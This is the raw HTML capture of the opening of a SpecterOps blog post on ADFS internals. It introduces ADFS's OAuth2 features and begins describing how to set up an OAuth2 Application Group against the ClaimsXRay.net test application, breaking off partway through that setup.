1.788v-1.749l-.213-.05c-8.7-2.006-12.089-5.789-12.089-13.49v-63.79c0-19.89-11.171-31.761-29.883-31.761-13.64 0-25.141 7.882-29.569 20.16-3.517-13.01-13.639-20.16-28.606-20.16-13.146 0-23.449 6.938-27.869 18.657V43.643L545.487 55.68v1.715l.263.024c9.345.829 12.047 4.181 12.047 14.95v81.784h40.787v-1.746l-.215-.053c-6.941-1.631-9.181-4.606-9.181-12.239V66.998c1.836-4.289 5.537-9.37 12.853-9.37 9.086 0 13.692 6.296 13.692 18.697v77.828h40.797v-1.746l-.215-.053c-6.94-1.631-9.18-4.606-9.18-12.239V75.066a42 42 0 0 0-.578-7.26c1.947-4.661 5.86-10.177 13.475-10.177 9.214 0 13.691 6.114 13.691 18.696v77.828z"></path></svg></a><div class="ax h"><div class="ab ay az ba bb q bc bd"><div class="bm" aria-hidden="false" aria-describedby="searchResults" aria-labelledby="searchResults"></div><div class="bn bo ab"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div><input role="combobox" aria-controls="searchResults" aria-expanded="false" aria-label="search" data-testid="headerSearchInput" tabindex="0" class="ay be bf bg z bh bi bj bk bl" placeholder="Search" value=""/></div></div></div><div class="h k w fg fh"><div class="fi ab"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerWriteButton" href="https://medium.com/m/signin?operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fnew-story&amp;source=---top_nav_layout_nav-----------------------new_post_topnav-----------" rel="noopener follow"><div class="bf b bg z du fj fk ab q fl fm"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" aria-label="Write"><path fill="currentColor" d="M14 4a.5.5 0 0 0 0-1zm7 6a.5.5 0 0 0-1 0zm-7-7H4v1h10zM3 4v16h1V4zm1 17h16v-1H4zm17-1V10h-1v10zm-1 1a1 1 0 0 0 1-1h-1zM3 20a1 1 0 0 0 1 1v-1zM4 3a1 1 0 0 0-1 1h1z"></path><path stroke="currentColor" d="m17.5 4.5-8.458 8.458a.25.25 0 0 0-.06.098l-.824 2.47a.25.25 0 0 0 .316.316l2.47-.823a.25.25 0 0 0 .098-.06L19.5 6.5m-2-2 2.323-2.323a.25.25 0 0 1 .354 0l1.646 1.646a.25.25 0 0 1 0 .354L19.5 6.5m-2-2 2 2"></path></svg><div class="dt l">Write</div></div></a></span></div></div><div class="k j i d"><div class="fi ab"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSearchButton" href="https://medium.com/search?source=---top_nav_layout_nav----------------------------------" rel="noopener follow"><div class="bf b bg z du fj fk ab q fl fm"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" aria-label="Search"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div></a></div></div><div class="fi h k j"><div class="ab q"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><a class="bf b dx dy eh dz ea ei eb ec ej ek ee el em eg eo ep eq er es et eu ev ew ex ey ez fa fb fc fd bm fe ff" data-testid="headerSignUpButton" href="https://medium.com/m/signin?operation=register&amp;redirect=https%3A%2F%2Fposts.specterops.io%2Fadfs-living-in-the-legacy-of-drs-c11f9b371811&amp;source=post_page---top_nav_layout_nav-----------------------global_nav-----------" rel="noopener follow">Sign up</a></span></p><div class="ax l"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSignInButton" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fposts.specterops.io%2Fadfs-living-in-the-legacy-of-drs-c11f9b371811&amp;source=post_page---top_nav_layout_nav-----------------------global_nav-----------" rel="noopener follow">Sign in</a></span></p></div></div></div><div class="l" aria-hidden="false"><button class="ay fn am ab q ao fo fp fq" aria-label="user options menu" data-testid="headerUserIcon"><div class="l fj"><img alt="" class="l fd by bz ca cx" src="https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png" width="32" height="32" loading="lazy" role="presentation"/><div class="fr by l bz ca fs n ay ft"></div></div></button></div></div></div><div class="l"><div class="fu fv fw fx fy l"><div class="ab cb"><div class="ci bh fz ga gb gc"></div></div><article><div class="l"><div class="l"><span class="l"></span><section><div><div class="fs gi gj gk gl gm"></div><div class="gn go gp gq gr"><div class="ab cb"><div class="ci bh fz ga gb gc"><div><h1 id="6f07" class="pw-post-title gs gt gu bf gv gw gx gy gz ha hb hc hd he hf hg hh hi hj hk hl hm hn ho hp hq hr hs ht hu bk" data-testid="storyTitle">ADFS — Living in the Legacy of DRS</h1><div><div class="speechify-ignore ab cp"><div class="speechify-ignore bh l"><div class="hv hw hx hy hz ab"><div><div class="ab ia"><div><div class="bm" aria-hidden="false"><a href="https://medium.com/@xpnsec?source=post_page---byline--c11f9b371811--------------------------------" rel="noopener follow"><div class="l ib ic by id ie"><div class="l fj"><img alt="Adam Chester" class="l fd by dd de cx" src="https://miro.medium.com/v2/resize:fill:88:88/1*UTZD7k5oVTNVGjNXZjwpYw.jpeg" width="44" height="44" loading="lazy" data-testid="authorPhoto"/><div class="if by l dd de fs n ig ft"></div></div></div></a></div></div><div class="ih ab fj"><div><div class="bm" aria-hidden="false"><a href="https://posts.specterops.io/?source=post_page---byline--c11f9b371811--------------------------------" rel="noopener  ugc nofollow"><div class="l ii ij by id ik"><div class="l fj"><img alt="Posts By SpecterOps Team Members" class="l fd by br il cx" src="https://miro.medium.com/v2/resize:fill:48:48/1*D-FDlfkqivRBQZoESrwtqw.png" width="24" height="24" loading="lazy" data-testid="publicationPhoto"/><div class="if by l br il fs n ig ft"></div></div></div></a></div></div></div></div></div><div class="bn bh l"><div class="ab"><div style="flex:1"><span class="bf b bg z bk"><div class="im ab q"><div class="ab q in"><div class="ab q"><div><div class="bm" aria-hidden="false"><p class="bf b io ip bk"><a class="af ag ah ai aj ak al am an ao ap aq ar iq" data-testid="authorName" href="https://medium.com/@xpnsec?source=post_page---byline--c11f9b371811--------------------------------" rel="noopener follow">Adam Chester</a></p></div></div></div><span class="ir is" aria-hidden="true"><span class="bf b bg z du">·</span></span><p class="bf b io ip du"><span><a class="it iu ah ai aj ak al am an ao ap aq ar ex iv iw" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F94749d3f8afc&amp;operation=register&amp;redirect=https%3A%2F%2Fposts.specterops.io%2Fadfs-living-in-the-legacy-of-drs-c11f9b371811&amp;user=Adam+Chester&amp;userId=94749d3f8afc&amp;source=post_page-94749d3f8afc--byline--c11f9b371811---------------------post_header-----------" rel="noopener follow">Follow</a></span></p></div></div></span></div></div><div class="l ix"><span class="bf b bg z du"><div class="ab cn iy iz ja"><div class="fu fv ab"><div class="bf b bg z du ab jb"><span class="jc l ix">Published in</span><div><div class="l" aria-hidden="false"><a class="af ag ah ai aj ak al am an ao ap aq ar iq ab q" data-testid="publicationName" href="https://posts.specterops.io/?source=post_page---byline--c11f9b371811--------------------------------" rel="noopener  ugc nofollow"><p class="bf b bg z jd je jf jg jh ji jj jk bk">Posts By SpecterOps Team Members</p></a></div></div></div><div class="h k"><span class="ir is" aria-hidden="true"><span class="bf b bg z du">·</span></span></div></div><span class="bf b bg z du"><div class="ab ae"><span data-testid="storyReadTime">22 min read</span><div class="jl jm l" aria-hidden="true"><span class="l" aria-hidden="true"><span class="bf b bg z du">·</span></span></div>3 days ago</div></span></div></span></div></div></div><div class="ab cp jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc"><div class="h k w fg fh q"><div class="ks l"><div class="ab q kt ku"><div class="pw-multi-vote-icon fj jc kv kw kx"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fspecter-ops-posts%2Fc11f9b371811&amp;operation=register&amp;redirect=https%3A%2F%2Fposts.specterops.io%2Fadfs-living-in-the-legacy-of-drs-c11f9b371811&amp;user=Adam+Chester&amp;userId=94749d3f8afc&amp;source=---header_actions--c11f9b371811---------------------clap_footer-----------" rel="noopener follow"><div><div class="bm" aria-hidden="false"><div class="ky ao kz la lb lc am ld le lf kx"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l lg lh li lj lk ll lm"><p class="bf b dv z du"><span class="ln">--</span></p></div></div></div><div><div class="bm" aria-hidden="false"><button class="ao ky lo lp ab q fk lq lr" aria-label="responses"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="ls"><path d="M18.006 16.803c1.533-1.456 2.234-3.325 2.234-5.321C20.24 7.357 16.709 4 12.191 4S4 7.357 4 11.482c0 4.126 3.674 7.482 8.191 7.482.817 0 1.622-.111 2.393-.327.231.2.48.391.744.559 1.06.693 2.203 1.044 3.399 1.044.224-.008.4-.112.486-.287a.49.49 0 0 0-.042-.518c-.495-.67-.845-1.364-1.04-2.057a4 4 0 0 1-.125-.598zm-3.122 1.055-.067-.223-.315.096a8 8 0 0 1-2.311.338c-4.023 0-7.292-2.955-7.292-6.587 0-3.633 3.269-6.588 7.292-6.588 4.014 0 7.112 2.958 7.112 6.593 0 1.794-.608 3.469-2.027 4.72l-.195.168v.255c0 .056 0 .151.016.295.025.231.081.478.154.733.154.558.398 1.117.722 1.659a5.3 5.3 0 0 1-2.165-.845c-.276-.176-.714-.383-.941-.59z"></path></svg></button></div></div></div><div class="ab q kd ke kf kg kh ki kj kk kl km kn ko kp kq kr"><div class="lt k j i d"></div><div class="h k"><div><div class="bm" aria-hidden="false"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerBookmarkButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2Fc11f9b371811&amp;operation=register&amp;redirect=https%3A%2F%2Fposts.specterops.io%2Fadfs-living-in-the-legacy-of-drs-c11f9b371811&amp;source=---header_actions--c11f9b371811---------------------bookmark_footer-----------" rel="noopener follow"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="du lu" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></a></span></div></div></div><div class="fd lv cn"><div class="l ae"><div class="ab cb"><div class="lw lx ly lz ma mb ci bh"><div class="ab"><div class="bm bh" aria-hidden="false"><div><div class="bm" aria-hidden="false"><button aria-label="Listen" data-testid="audioPlayButton" class="af fk ah ai aj ak al mc an ao ap ex md me lr mf mg mh mi mj s mk ml mm mn mo mp mq u mr ms mt"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M3 12a9 9 0 1 1 18 0 9 9 0 0 1-18 0m9-10C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2m3.376 10.416-4.599 3.066a.5.5 0 0 1-.777-.416V8.934a.5.5 0 0 1 .777-.416l4.599 3.066a.5.5 0 0 1 0 .832" clip-rule="evenodd"></path></svg><div class="j i d"><p class="bf b bg z du">Listen</p></div></button></div></div></div></div></div></div></div></div><div class="bm" aria-hidden="false" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bm" aria-hidden="false"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="headerSocialShareButton" class="af fk ah ai aj ak al mc an ao ap ex md me lr mf mg mh mi mj s mk ml mm mn mo mp mq u mr ms mt"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M15.218 4.931a.4.4 0 0 1-.118.132l.012.006a.45.45 0 0 1-.292.074.5.5 0 0 1-.3-.13l-2.02-2.02v7.07c0 .28-.23.5-.5.5s-.5-.22-.5-.5v-7.04l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.79a.42.42 0 0 1 .068.498m-.106.138.008.004v-.01zM16 7.063h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11c-1.1 0-2-.9-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.15.5.5 0 0 1 .15.35.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9v-10.2c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1" clip-rule="evenodd"></path></svg><div class="j i d"><p class="bf b bg z du">Share</p></div></button></div></div></div></div></div></div></div></div></div><p id="1bf6" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">It’s no secret that Microsoft have been trying to move customers away from ADFS for a while. Short of slapping a “deprecated” label on it, every bit of documentation I come across eventually explains why Entra ID should now be used in place of ADFS.</p><p id="0e53" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">And yet… we still encounter it everywhere! Even in organisations that have embraced Entra ID, we have Hybrid Joined environments which often mix federated authentication in with cloud management. So while it’s nice to chase the shiny new thing, building knowledge around ADFS is still a worthwhile way to spend an evening.</p><p id="d30b" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">So in this post we’re going to focus on some ADFS internals. We’ll be staying clear of the SAML areas which have been beaten to death, and instead we’re going to look at OAuth2, and how it underpins the analogues to Entra ID security features like Device Registration and Primary Refresh Tokens.</p><p id="10e3" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">I’m honestly not sure how useful any of this post will be in a practical sense. I’ve tried to gather data on internet facing ADFS servers to see what configurations are out there to help hone my research, but I found this area way too interesting to leave on my Notion notebook to rot.</p><p id="a06a" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">So if a single person is able to make use of this content to achieve their objective in a future assessment, or just to understand why the <code class="cx ns nt nu nv b">msDS-Device</code> object exists, it was worth posting.</p><h1 id="2d6f" class="nw nx gu bf ny nz oa ob oc od oe of og oh oi oj ok ol om on oo op oq or os ot bk">ADFS and OAuth2</h1><p id="59f2" class="pw-post-body-paragraph mu mv gu mw b mx ou mz na nb ov nd ne nf ow nh ni nj ox nl nm nn oy np nq nr gn bk">You’d be forgiven for thinking that ADFS is primary a SAML token generator. After all, most post-ex techniques focus on areas like Golden SAML, having been used with success on countless engagements over the years.</p><p id="76f6" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">But the other side to ADFS is OAuth2. Of course there is a coating of “Microsoft Stank” (as my colleague <a class="af oz" href="https://x.com/hotnops" rel="noopener ugc nofollow" target="_blank">@hotnops</a> likes to call it when presenting research into some Entra ID madness) applied to the terms that Microsoft use, but it’s very much an OAuth2 provider under the hood.</p><p id="28a2" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">I’ll begin by giving a very quick overview of OAuth2 on ADFS to set the stage for what we will discuss later on.</p><p id="58cd" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">Let’s start with how to set up a simple OAuth2 integration. In the ADFS management console we have “Application Groups”:</p><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div role="button" tabindex="0" class="pj pk fj pl bh pm"><div class="pa pb pc"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*HBGWGtOyrx-eoCK9AtSpMQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*HBGWGtOyrx-eoCK9AtSpMQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*HBGWGtOyrx-eoCK9AtSpMQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*HBGWGtOyrx-eoCK9AtSpMQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*HBGWGtOyrx-eoCK9AtSpMQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*HBGWGtOyrx-eoCK9AtSpMQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HBGWGtOyrx-eoCK9AtSpMQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*HBGWGtOyrx-eoCK9AtSpMQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*HBGWGtOyrx-eoCK9AtSpMQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*HBGWGtOyrx-eoCK9AtSpMQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*HBGWGtOyrx-eoCK9AtSpMQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*HBGWGtOyrx-eoCK9AtSpMQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*HBGWGtOyrx-eoCK9AtSpMQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*HBGWGtOyrx-eoCK9AtSpMQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mb pn c" width="700" height="384" loading="lazy" role="presentation"/></picture></div></div></figure><p id="8a07" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">This is where ADFS allows configuration of OAuth2 clients and servers. We’ll set up a new Application Group and call it “Test App Group”, where we’ll be presented with a number of templates:</p><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div role="button" tabindex="0" class="pj pk fj pl bh pm"><div class="pa pb po"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*WI_sCNTMJsjv75CjmXQUfg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*WI_sCNTMJsjv75CjmXQUfg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*WI_sCNTMJsjv75CjmXQUfg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*WI_sCNTMJsjv75CjmXQUfg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*WI_sCNTMJsjv75CjmXQUfg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*WI_sCNTMJsjv75CjmXQUfg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WI_sCNTMJsjv75CjmXQUfg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*WI_sCNTMJsjv75CjmXQUfg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*WI_sCNTMJsjv75CjmXQUfg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*WI_sCNTMJsjv75CjmXQUfg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*WI_sCNTMJsjv75CjmXQUfg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*WI_sCNTMJsjv75CjmXQUfg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*WI_sCNTMJsjv75CjmXQUfg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*WI_sCNTMJsjv75CjmXQUfg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mb pn c" width="700" height="569" loading="lazy" role="presentation"/></picture></div></div></figure><p id="dcf1" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">Microsoft provide an overview of each template via the “More information” button, but <a class="af oz" href="https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/overview/ad-fs-openid-connect-oauth-flows-scenarios" rel="noopener ugc nofollow" target="_blank">this</a> table from the documentation provides a useful set of translations to understand Microsoft’s OAuth2 terminology:</p><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div role="button" tabindex="0" class="pj pk fj pl bh pm"><div class="pa pb pp"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*ecjClrTAuXcmxXVnfCBRMQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*ecjClrTAuXcmxXVnfCBRMQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*ecjClrTAuXcmxXVnfCBRMQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*ecjClrTAuXcmxXVnfCBRMQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*ecjClrTAuXcmxXVnfCBRMQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*ecjClrTAuXcmxXVnfCBRMQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ecjClrTAuXcmxXVnfCBRMQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*ecjClrTAuXcmxXVnfCBRMQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*ecjClrTAuXcmxXVnfCBRMQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*ecjClrTAuXcmxXVnfCBRMQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*ecjClrTAuXcmxXVnfCBRMQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*ecjClrTAuXcmxXVnfCBRMQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*ecjClrTAuXcmxXVnfCBRMQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*ecjClrTAuXcmxXVnfCBRMQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh mb pn c" width="700" height="203" loading="lazy" role="presentation"/></picture></div></div></figure><p id="4499" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">For now, let’s choose the “Web browser accessing a web application” template. We’ll use the <a class="af oz" href="http://ClaimsXRay.net" rel="noopener ugc nofollow" target="_blank">ClaimsXRay.net</a> web application as our target, which is a nice application used to test IdP integrations (modelled after Microsoft’s own deprecated ClaimsXRay service).</p><p id="8489" class="pw-post-body-paragraph mu mv gu mw b mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr gn bk">On the next screen we need to assign the <code class="cx ns nt nu nv b">Client Identifier</code> and redirect URI which we’ll set to <code class="cx ns nt nu nv b"><a class="af oz" href="https://claimsxray.net/token:" rel="noopener ugc nofollow" target="_blank">https://claimsxray.net/token</a></code><a class="af oz" href="https://claimsxray.net/token:" rel="noopener ugc nofollow" target="_blank">:</a></p><figure class="pd pe pf pg ph pi pa pb paragraph-image"><div role="button" tabindex="0" class="pj pk fj pl bh pm"><div class="pa pb pq"><picture><source 